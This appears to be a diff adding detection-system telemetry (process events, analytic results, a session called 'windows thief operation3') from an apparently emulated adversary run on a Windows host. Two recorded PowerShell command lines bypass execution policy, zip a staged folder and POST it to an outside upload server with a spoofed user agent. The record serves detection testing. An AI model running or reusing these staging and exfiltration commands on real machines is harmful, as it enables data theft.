+        "labeled_links": [],
+        "labeled_reverse_links": [
+          {
+            "event": "6492dfb7e0faa41fea8badac",
+            "label": "lookup_parent"
+          }
+        ],
+        "links": [],
+        "metadata": {},
+        "object_type": "process",
+        "reverse_links": [
+          "6492dfb7e0faa41fea8badac"
+        ],
+        "sessions": [
+          "6492dfafe36f03f45b27b603"
+        ],
+        "state": {
+          "_cls": "ProcessEventState",
+          "command_line": "powershell.exe -ExecutionPolicy Bypass -C \"Compress-Archive -Path C:\\Windows\\system32\\staged -DestinationPath C:\\Windows\\system32\\staged.zip -Force;sleep 1; ls C:\\Windows\\system32\\staged.zip | foreach {$_.FullName} | select\"",
+          "exe": "powershell.exe",
+          "fqdn": "DESKTOP-F7VUDU8",
+          "hostname": "DESKTOP-F7VUDU8",
+          "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "integrity_level": "High",
+          "md5_hash": "BCF01E61144D6D6325650134823198B8",
+          "parent_exe": "-",
+          "parent_image_path": "-",
+          "pid": "3488",
+          "ppid": "2164",
+          "sha1_hash": "EB39E26A364ECD0691A59FCEF61A90334112617E",
+          "terminal_session_id": "1",
+          "user": "DESKTOP-F7VUDU8\\jorge"
+        },
+        "time": "2023-06-21T11:32:13.405000+00:00",
+        "uuid": "DataModelEvent.ProcessEvent-desktop-f7vudu8-process-create-2023-06-21t11:32:13-3488"
+      },
+      {
+        "_cls": "DataModelEvent.ProcessEvent",
+        "_id": "6492e009e0faa41fea8bae92",
+        "action": "create",
+        "confidence": 0.0,
+        "discovered_time": "2023-06-21T11:33:29.758000+00:00",
+        "host": "64922a52e0faa41fea8aea7f",
+        "labeled_links": [
+          {
+            "event": "6492e00be0faa41fea8baebf",
+            "label": "network_connection"
+          }
+        ],
+        "labeled_reverse_links": [
+          {
+            "event": "6492dfb7e0faa41fea8badac",
+            "label": "lookup_parent"
+          }
+        ],
+        "links": [
+          "6492e00be0faa41fea8baebf"
+        ],
+        "metadata": {},
+        "object_type": "process",
+        "reverse_links": [
+          "6492dfb7e0faa41fea8badac"
+        ],
+        "sessions": [
+          "6492dfafe36f03f45b27b603"
+        ],
+        "state": {
+          "_cls": "ProcessEventState",
+          "command_line": "powershell.exe -ExecutionPolicy Bypass -C \"$ErrorActionPreference = 'Stop';$fieldName = \\\"C:\\Windows\\system32\\staged.zip\\\";$filePath = \\\"C:\\Windows\\system32\\staged.zip\\\";$url = \\\"http://192.168.122.4:8888/file/upload\\\";Add-Type -AssemblyName 'System.Net.Http';$client = New-Object System.Net.Http.HttpClient;$content = New-Object System.Net.Http.MultipartFormDataContent;$fileStream = [System.IO.File]::OpenRead($filePath);$fileName = [System.IO.Path]::GetFileName($filePath);$fileContent = New-Object System.Net.Http.StreamContent($fileStream);$content.Add($fileContent, $fieldName, $fileName);$client.DefaultRequestHeaders.Add(\\\"X-Request-Id\\\", $env:COMPUTERNAME + '-ipawdq');$client.DefaultRequestHeaders.Add(\\\"User-Agent\\\",\\\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\\\");$result = $client.PostAsync($url, $content).Result;$result.EnsureSuccessStatusCode();\"",
+          "exe": "powershell.exe",
+          "fqdn": "DESKTOP-F7VUDU8",
+          "hostname": "DESKTOP-F7VUDU8",
+          "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "integrity_level": "High",
+          "md5_hash": "BCF01E61144D6D6325650134823198B8",
+          "parent_exe": "-",
+          "parent_image_path": "-",
+          "pid": "3464",
+          "ppid": "2164",
+          "sha1_hash": "EB39E26A364ECD0691A59FCEF61A90334112617E",
+          "terminal_session_id": "1",
+          "user": "DESKTOP-F7VUDU8\\jorge"
+        },
+        "time": "2023-06-21T11:33:09.421000+00:00",
+        "uuid": "DataModelEvent.ProcessEvent-desktop-f7vudu8-process-create-2023-06-21t11:33:09-3464"
+      },
+      {
+        "_cls": "DataModelEvent.ProcessEvent",
+        "_id": "6492e181e0faa41fea8baec3",
+        "action": "create",
+        "confidence": 0.0,
+        "discovered_time": "2023-06-21T11:39:45.200000+00:00",
+        "host": "64922a52e0faa41fea8aea7f",
+        "labeled_links": [],
+        "labeled_reverse_links": [],
+        "links": [],
+        "metadata": {},
+        "object_type": "process",
+        "reverse_links": [],
+        "sessions": [
+          "6492dfafe36f03f45b27b603"
+        ],
+        "state": {
+          "_cls": "ProcessEventState",
+          "command_line": "\"C:\\Windows\\system32\\SearchFilterHost.exe\" 0 796 800 808 8192 804 780 ",
+          "exe": "SearchFilterHost.exe",
+          "fqdn": "DESKTOP-F7VUDU8",
+          "hostname": "DESKTOP-F7VUDU8",
+          "image_path": "C:\\Windows\\System32\\SearchFilterHost.exe",
+          "integrity_level": "Medium",
+          "md5_hash": "CBE5C77B387346F6ACE43A512CFEFDCC",
+          "parent_exe": "SearchIndexer.exe",
+          "parent_image_path": "C:\\Windows\\System32\\SearchIndexer.exe",
+          "pid": "6968",
+          "ppid": "3100",
+          "sha1_hash": "7AD70F1B4B801386BC041CC9D06620D761A1755A",
+          "terminal_session_id": "0",
+          "user": "NT AUTHORITY\\SYSTEM"
+        },
+        "time": "2023-06-21T11:34:29.972000+00:00",
+        "uuid": "DataModelEvent.ProcessEvent-desktop-f7vudu8-process-create-2023-06-21t11:34:29-6968"
+      }
+    ]
+  },
+  {
+    "collection": "analytic_result",
+    "content": [
+      {
+        "_id": "6492dfb7e0faa41fea8bada7",
+        "analytic": "56c6ad75cefaff28c888d60d",
+        "events": [
+          "6492dfb7e0faa41fea8bada5"
+        ],
+        "result": {},
+        "session": "6492dfafe36f03f45b27b603",
+        "uuid": "AnalyticResult-56c6ad75cefaff28c888d60d-6492dfafe36f03f45b27b603-6492dfb7e0faa41fea8bada5"
+      },
+      {
+        "_id": "6492dfb7e0faa41fea8bada8",
+        "analytic": "571e4fb57f57a7d73599d9dc",
+        "events": [
+          "6492dfb7e0faa41fea8bada6"
+        ],
+        "result": {},
+        "session": "6492dfafe36f03f45b27b603",
+        "uuid": "AnalyticResult-571e4fb57f57a7d73599d9dc-6492dfafe36f03f45b27b603-6492dfb7e0faa41fea8bada6"
+      },
+      {
+        "_id": "6492dfb7e0faa41fea8badad",
+        "analytic": "571e4fb57f57a7d73599d9dc",
+        "events": [
+          "6492dfb7e0faa41fea8badab"
+        ],
+        "result": {},
+        "session": "6492dfafe36f03f45b27b603",
+        "uuid": "AnalyticResult-571e4fb57f57a7d73599d9dc-6492dfafe36f03f45b27b603-6492dfb7e0faa41fea8badab"
+      },
+      {
+        "_id": "6492dfb7e0faa41fea8badaf",
+        "analytic": "56c6ad75cefaff28c888d60d",
+        "events": [
+          "6492dfb7e0faa41fea8badac"
+        ],
+        "result": {},
+        "session": "6492dfafe36f03f45b27b603",
+        "uuid": "AnalyticResult-56c6ad75cefaff28c888d60d-6492dfafe36f03f45b27b603-6492dfb7e0faa41fea8badac"
+      },
+      {
+        "_id": "6492dfb7e0faa41fea8badb2",
+        "analytic": "571e4fb57f57a7d73599d9dc",
+        "events": [
+          "6492dfb7e0faa41fea8badb1"
+        ],
+        "result": {},
+        "session": "6492dfafe36f03f45b27b603",
+        "uuid": "AnalyticResult-571e4fb57f57a7d73599d9dc-6492dfafe36f03f45b27b603-6492dfb7e0faa41fea8badb1"
+      },
+      {
+        "_id": "6492dfb7e0faa41fea8badb5",
+        "analytic": "56c6ad75cefaff28c888d60d",
+        "events": [
+          "6492dfb7e0faa41fea8badb4"
+        ],
+        "result": {},
+        "session": "6492dfafe36f03f45b27b603",
+        "uuid": "AnalyticResult-56c6ad75cefaff28c888d60d-6492dfafe36f03f45b27b603-6492dfb7e0faa41fea8badb4"
+      },
+      {
+        "_id": "6492dfb7e0faa41fea8badb8",
+        "analytic": "56c6ad75cefaff28c888d60d",
+        "events": [
+          "6492dfb7e0faa41fea8bada6"
+        ],
+        "result": {},
+        "session": "6492dfafe36f03f45b27b603",
+        "uuid": "AnalyticResult-56c6ad75cefaff28c888d60d-6492dfafe36f03f45b27b603-6492dfb7e0faa41fea8bada6"
+      },
+      {
+        "_id": "6492dfb7e0faa41fea8badb9",
+        "analytic": "571e4fb57f57a7d73599d9dc",
+        "events": [
+          "6492dfb7e0faa41fea8badb7"
+        ],
+        "result": {},
+        "session": "6492dfafe36f03f45b27b603",
+        "uuid": "AnalyticResult-571e4fb57f57a7d73599d9dc-6492dfafe36f03f45b27b603-6492dfb7e0faa41fea8badb7"
+      },
+      {
+        "_id": "6492dfb7e0faa41fea8badbb",
+        "analytic": "56c6ad75cefaff28c888d60d",
+        "events": [
+          "6492dfb7e0faa41fea8badab"
+        ],
+        "result": {},
+        "session": "6492dfafe36f03f45b27b603",
+        "uuid": "AnalyticResult-56c6ad75cefaff28c888d60d-6492dfafe36f03f45b27b603-6492dfb7e0faa41fea8badab"
+      },
+      {
+        "_id": "6492dfb7e0faa41fea8badbd",
+        "analytic": "571e4fb57f57a7d73599d9dc",
+        "events": [
+          "6492dfb7e0faa41fea8badbc"
+        ],
+        "result": {},
+        "session": "6492dfafe36f03f45b27b603",
+        "uuid": "AnalyticResult-571e4fb57f57a7d73599d9dc-6492dfafe36f03f45b27b603-6492dfb7e0faa41fea8badbc"
+      },
+      {
+        "_id": "6492dfb7e0faa41fea8badc1",
+        "analytic": "56c6ad75cefaff28c888d60d",
+        "events": [
+          "6492dfb7e0faa41fea8badc0"
+        ],
+        "result": {},
+        "session": "6492dfafe36f03f45b27b603",
+        "uuid": "AnalyticResult-56c6ad75cefaff28c888d60d-6492dfafe36f03f45b27b603-6492dfb7e0faa41fea8badc0"
+      },
+      {
+        "_id": "6492dfb7e0faa41fea8badc2",
+        "analytic": "571e4fb57f57a7d73599d9dc",
+        "events": [
+          "6492dfb7e0faa41fea8badbf"
+        ],
+        "result": {},
+        "session": "6492dfafe36f03f45b27b603",
+        "uuid": "AnalyticResult-571e4fb57f57a7d73599d9dc-6492dfafe36f03f45b27b603-6492dfb7e0faa41fea8badbf"
+      },
+      {
+        "_id": "6492dfb7e0faa41fea8badc5",
+        "analytic": "571e4fb57f57a7d73599d9dc",
+        "events": [
+          "6492dfb7e0faa41fea8badc4"
+        ],
+        "result": {},
+        "session": "6492dfafe36f03f45b27b603",
+        "uuid": "AnalyticResult-571e4fb57f57a7d73599d9dc-6492dfafe36f03f45b27b603-6492dfb7e0faa41fea8badc4"
+      },
+      {
+        "_id": "6492dfb7e0faa41fea8badca",
+        "analytic": "571e4fb57f57a7d73599d9dc",
+        "events": [
+          "6492dfb7e0faa41fea8badc8"
+        ],
+        "result": {},
+        "session": "6492dfafe36f03f45b27b603",
+        "uuid": "AnalyticResult-571e4fb57f57a7d73599d9dc-6492dfafe36f03f45b27b603-6492dfb7e0faa41fea8badc8"
+      },
+      {
+        "_id": "6492dfb7e0faa41fea8badcc",
+        "analytic": "56c6ad75cefaff28c888d60d",
+        "events": [
+          "6492dfb7e0faa41fea8badc9"
+        ],
+        "result": {},
+        "session": "6492dfafe36f03f45b27b603",
+        "uuid": "AnalyticResult-56c6ad75cefaff28c888d60d-6492dfafe36f03f45b27b603-6492dfb7e0faa41fea8badc9"
+      },
+      {
+        "_id": "6492e009e0faa41fea8bae8d",
+        "analytic": "56c6ad75cefaff28c888d60d",
+        "events": [
+          "6492e009e0faa41fea8bae8c"
+        ],
+        "result": {},
+        "session": "6492dfafe36f03f45b27b603",
+        "uuid": "AnalyticResult-56c6ad75cefaff28c888d60d-6492dfafe36f03f45b27b603-6492e009e0faa41fea8bae8c"
+      },
+      {
+        "_id": "6492e009e0faa41fea8bae90",
+        "analytic": "571e4fb57f57a7d73599d9dc",
+        "events": [
+          "6492e009e0faa41fea8bae8f"
+        ],
+        "result": {},
+        "session": "6492dfafe36f03f45b27b603",
+        "uuid": "AnalyticResult-571e4fb57f57a7d73599d9dc-6492dfafe36f03f45b27b603-6492e009e0faa41fea8bae8f"
+      },
+      {
+        "_id": "6492e009e0faa41fea8bae93",
+        "analytic": "571e4fb57f57a7d73599d9dc",
+        "events": [
+          "6492e009e0faa41fea8bae92"
+        ],
+        "result": {},
+        "session": "6492dfafe36f03f45b27b603",
+        "uuid": "AnalyticResult-571e4fb57f57a7d73599d9dc-6492dfafe36f03f45b27b603-6492e009e0faa41fea8bae92"
+      },
+      {
+        "_id": "6492e016e0faa41fea8baec1",
+        "analytic": "6492c620e36f03f45b27b317",
+        "events": [
+          "6492dfb7e0faa41fea8badab"
+        ],
+        "result": {},
+        "session": "6492dfafe36f03f45b27b603",
+        "uuid": "AnalyticResult-6492c620e36f03f45b27b317-6492dfafe36f03f45b27b603-6492dfb7e0faa41fea8badab"
+      },
+      {
+        "_id": "6492e016e0faa41fea8baec2",
+        "analytic": "6492c620e36f03f45b27b317",
+        "events": [
+          "6492e009e0faa41fea8bae8f"
+        ],
+        "result": {},
+        "session": "6492dfafe36f03f45b27b603",
+        "uuid": "AnalyticResult-6492c620e36f03f45b27b317-6492dfafe36f03f45b27b603-6492e009e0faa41fea8bae8f"
+      },
+      {
+        "_id": "6492e181e0faa41fea8baec4",
+        "analytic": "56c6ad75cefaff28c888d60d",
+        "events": [
+          "6492e181e0faa41fea8baec3"
+        ],
+        "result": {},
+        "session": "6492dfafe36f03f45b27b603",
+        "uuid": "AnalyticResult-56c6ad75cefaff28c888d60d-6492dfafe36f03f45b27b603-6492e181e0faa41fea8baec3"
+      }
+    ]
+  },
+  {
+    "collection": "session",
+    "content": [
+      {
+        "_id": "6492dfafe36f03f45b27b603",
+        "name": "windows thief operation3",
+        "range": {
+          "_cls": "AbsoluteRange",
+          "end": "2023-06-21T11:35:00+00:00",
+          "start": "2023-06-21T11:25:00+00:00"
+        },
+        "state": {
+          "analytics": [
+            {
+              "analytic": "56c6ad75cefaff28c888d60e",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d60f",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d611",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d612",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d614",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d616",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d619",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d634",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d61a",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d61b",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d61c",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d61d",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d61e",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d622",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d623",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d624",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d625",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d628",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d62e",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d630",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d610",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d61f",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d632",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d638",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d639",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d63a",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d63b",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d63f",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d640",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d641",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d642",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d643",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d644",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d60d",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "5716a971704a12d841ed3162",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "571e4fb57f57a7d73599d9dc",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d63e",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d649",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d64a",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d615",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d63d",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d60c",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d613",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d617",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d618",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "5785bb8155f0953350fed27c",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "577c2186ce4ace904e344339",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "5786d41c55f0953350fed27e",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "578cc6b920455df811d233d6",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "578e3c8920455df811d233d7",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "578e4ffccefaff3e642968c6",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "579915d2b16e3c9abd53a159",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "579a56ccb16e3c9abd53a15a",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "579b59abb16e3c9abd53a15b",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "579b6a5cb16e3c9abd53a15c",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "57acf4a3866101d40cd8be47",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "57d0241ac78b0b34d5077e0f",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "57d72021c78b0b34d5077e10",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "582f29b9f05f26549cdc29b0",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "582f2e51f05f26549cdc29b1",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "586fdff2f05f264860a5ff6d",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "586fe0d1f05f264860a5ff6e",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "586fe3c5f05f264860a5ff71",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "586fe826f05f264860a5ff73",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "6492c620e36f03f45b27b317",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d60e",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d60f",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d611",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d612",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d614",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d616",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d619",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d634",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d61a",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d61b",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d61c",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d61d",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d61e",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d622",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d623",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d624",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d625",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d628",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d62e",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d630",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d610",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d61f",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d632",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d638",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d639",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d63a",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d63b",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d63f",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d640",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d641",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d642",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d643",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d644",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d60d",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "5716a971704a12d841ed3162",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "571e4fb57f57a7d73599d9dc",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d63e",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d649",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d64a",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d615",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d63d",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d60c",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d613",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d617",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d618",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "5785bb8155f0953350fed27c",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "577c2186ce4ace904e344339",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "5786d41c55f0953350fed27e",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "578cc6b920455df811d233d6",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "578e3c8920455df811d233d7",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "578e4ffccefaff3e642968c6",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "579915d2b16e3c9abd53a159",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "579a56ccb16e3c9abd53a15a",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "579b59abb16e3c9abd53a15b",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "579b6a5cb16e3c9abd53a15c",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "57acf4a3866101d40cd8be47",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "57d0241ac78b0b34d5077e0f",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "57d72021c78b0b34d5077e10",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "582f29b9f05f26549cdc29b0",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "582f2e51f05f26549cdc29b1",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "586fdff2f05f264860a5ff6d",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "586fe0d1f05f264860a5ff6e",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "586fe3c5f05f264860a5ff71",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "586fe826f05f264860a5ff73",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "6492c620e36f03f45b27b317",
+              "mode": "second-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d64b",
+              "mode": "first-pass"
+            },
+            {
+              "analytic": "56c6ad75cefaff28c888d64b",
+              "mode": "second-pass"
+            }
+          ]
+        }
+      }
+    ]
+  }
+]
